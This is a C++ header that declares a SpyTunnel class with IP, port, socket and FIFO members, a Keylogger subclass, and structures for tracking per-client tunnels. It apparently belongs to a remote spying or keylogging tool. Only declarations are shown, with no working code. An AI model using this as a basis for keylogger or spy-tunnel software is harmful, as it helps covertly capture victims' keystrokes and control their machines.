#ifndef SPY_TUNNEL_HPP
#define SPY_TUNNEL_HPP

#include "include_tunnel.hpp"

class SpyTunnel {
public:
    SpyTunnel() = default;
    int init(std::string __ip, uint __port, int*& p_tunnel_shutdown_fd, int __connection_type);
    void run();
    void shutdown();
    void edit_path(int __client_index, CommandCode __command_code);
protected:
    std::string ip_;
    uint port_;
    struct sockaddr_in tunnel_addr_;
    int tunnel_socket_;
    ScopedEpollFD tunnel_shutdown_fd_;
    int tunnel_fifo_ = -1;
    pid_t pid_;
    std::string fifo_path_;

    void write_fifo_error(const std::string& __msg);
    virtual void spawn_window();
};

class Keylogger : public SpyTunnel {
public:
    Keylogger() = default;
protected:
    void spawn_window() override;
};

struct Tunnel {
    CommandCode command_code_;
    int client_index_;
    SpyTunnel* p_spy_tunnel_;
    int* p_tunnel_shutdown_fd_;
    static std::atomic<int> active_tunnels_;
    Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel);
};

struct TunnelContext {
    std::mutex tunnel_mutex_;
    std::condition_variable all_processed_cv_;
};

void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, CommandCode __command_code);



#endif //SPY_TUNNEL_HPP